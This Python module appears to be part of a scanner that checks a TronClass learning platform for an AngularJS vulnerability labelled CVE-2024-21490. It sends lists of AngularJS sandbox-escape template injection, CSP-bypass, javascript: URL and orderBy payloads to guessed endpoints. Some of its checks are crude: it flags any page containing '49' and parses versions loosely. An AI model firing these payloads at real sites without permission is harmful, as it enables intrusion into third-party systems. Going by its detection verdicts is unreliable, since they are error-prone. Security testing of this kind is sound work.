"""
CVE-2024-21490 Vulnerability Detection Script
AngularJS vulnerability detection for TronClass LMS
"""

import requests
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    Scan for CVE-2024-21490 vulnerability
    AngularJS template injection and client-side vulnerabilities
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2024-21490: AngularJS template injection and client-side template vulnerability',
        'remediation': 'Update AngularJS to latest version, implement proper input sanitization, and use strict CSP headers'
    }
    
    try:
        # First, check if AngularJS is being used
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller',
            'ng-model',
            'ng-repeat',
            'ng-if',
            'ng-click',
            'angular.module',
            'angular.version'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        
        if not uses_angular:
            result['evidence'] = "AngularJS not detected on the target"
            return result
        
        # AngularJS template injection payloads
        angular_payloads = [
            '{{7*7}}',
            '{{constructor.constructor("alert(1)")()}}',
            '{{$eval.constructor("alert(1)")()}}',
            '{{$on.constructor("alert(1)")()}}',
            '{{toString.constructor.prototype.toString.constructor.prototype.constructor("alert(1)")()}}',
            '{{[].pop.constructor("alert(1)")()}}',
            '{{""["constructor"]["constructor"]("alert(1)")()}}',
            '{{$new.constructor("alert(1)")()}}',
            '{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}',
            '{{$eval("1+1")}}',
            '{{$root.constructor.constructor("alert(1)")()}}',
            '{{this.constructor.constructor("alert(1)")()}}',
            '{{[].constructor.constructor("alert(1)")()}}'
        ]
        
        # Test endpoints for AngularJS template injection
        test_endpoints = [
            '/search',
            '/profile',
            '/course',
            '/message',
            '/comment',
            '/feedback',
            '/quiz',
            '/assignment'
        ]
        
        for endpoint in test_endpoints:
            for payload in angular_payloads:
                try:
                    # Test GET parameters
                    response = session.get(
                        urljoin(target_url, endpoint),
                        params={'q': payload, 'search': payload, 'message': payload},
                        timeout=30
                    )
                    
                    # Check for template injection execution
                    if '49' in response.text and '{{7*7}}' in payload:
                        result['vulnerable'] = True
                        result['evidence'] = f"AngularJS template injection detected at {endpoint} - payload executed: {payload}"
                        return result
                    
                    # Check for other injection patterns
                    if payload in response.text and not any(escape in response.text for escape in ['&lt;', '&gt;', '&quot;']):
                        result['vulnerable'] = True
                        result['evidence'] = f"AngularJS template injection detected at {endpoint} - payload reflected: {payload}"
                        return result
                    
                    # Test POST parameters
                    post_data = {
                        'comment': payload,
                        'message': payload,
                        'content': payload,
                        'description': payload,
                        'title': payload
                    }
                    
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data=post_data,
                        timeout=30
                    )
                    
                    if '49' in response.text and '{{7*7}}' in payload:
                        result['vulnerable'] = True
                        result['evidence'] = f"AngularJS template injection detected at {endpoint} (POST) - payload executed: {payload}"
                        return result
                        
                except:
                    continue
        
        # Check for specific AngularJS vulnerabilities
        version_check_response = session.get(target_url, timeout=30)
        
        # Extract AngularJS version
        version_patterns = [
            r'angular\.version\s*=\s*["\']?([0-9.]+)',
            r'angular\.js\?v=([0-9.]+)',
            r'angular\.min\.js\?v=([0-9.]+)',
            r'AngularJS\s+v([0-9.]+)'
        ]
        
        for pattern in version_patterns:
            match = re.search(pattern, version_check_response.text)
            if match:
                version = match.group(1)
                # Check if version is vulnerable (assuming versions < 1.8.0 are vulnerable)
                if version.startswith('1.') and float(version[:3]) < 1.8:
                    result['vulnerable'] = True
                    result['evidence'] = f"Vulnerable AngularJS version detected: {version}"
                    return result
        
        # Test for $eval vulnerabilities
        eval_payloads = [
            '$eval(alert(1))',
            '$eval("alert(1)")',
            '$eval(console.log("vulnerable"))'
        ]
        
        for payload in eval_payloads:
            try:
                response = session.get(
                    urljoin(target_url, '/search'),
                    params={'q': payload},
                    timeout=30
                )
                
                if payload in response.text:
                    result['vulnerable'] = True
                    result['evidence'] = f"AngularJS $eval vulnerability detected with payload: {payload}"
                    return result
            except:
                continue
        
        # Test for CSP bypass
        csp_bypass_payloads = [
            '{{constructor.constructor("return location")()}}',
            '{{this["constructor"]["constructor"]("return location")()}}',
            '{{$new["constructor"]["constructor"]("return location")()}}'
        ]
        
        for payload in csp_bypass_payloads:
            try:
                response = session.get(
                    urljoin(target_url, '/search'),
                    params={'q': payload},
                    timeout=30
                )
                
                if payload in response.text:
                    result['vulnerable'] = True
                    result['evidence'] = f"AngularJS CSP bypass vulnerability detected with payload: {payload}"
                    return result
            except:
                continue
        
        # Test for ng-src vulnerabilities
        ng_src_payloads = [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>'
        ]
        
        for payload in ng_src_payloads:
            try:
                response = session.get(
                    urljoin(target_url, '/profile'),
                    params={'avatar': payload},
                    timeout=30
                )
                
                if f'ng-src="{payload}"' in response.text or f"ng-src='{payload}'" in response.text:
                    result['vulnerable'] = True
                    result['evidence'] = f"AngularJS ng-src vulnerability detected with payload: {payload}"
                    return result
            except:
                continue
        
        # Test for orderBy filter vulnerabilities
        orderby_payloads = [
            'constructor',
            'constructor.constructor',
            'constructor.constructor("alert(1)")'
        ]
        
        for payload in orderby_payloads:
            try:
                response = session.get(
                    urljoin(target_url, '/course'),
                    params={'orderBy': payload},
                    timeout=30
                )
                
                if payload in response.text:
                    result['vulnerable'] = True
                    result['evidence'] = f"AngularJS orderBy filter vulnerability detected with payload: {payload}"
                    return result
            except:
                continue
                
    except Exception as e:
        result['evidence'] = f"Error during scan: {str(e)}"
    
    return result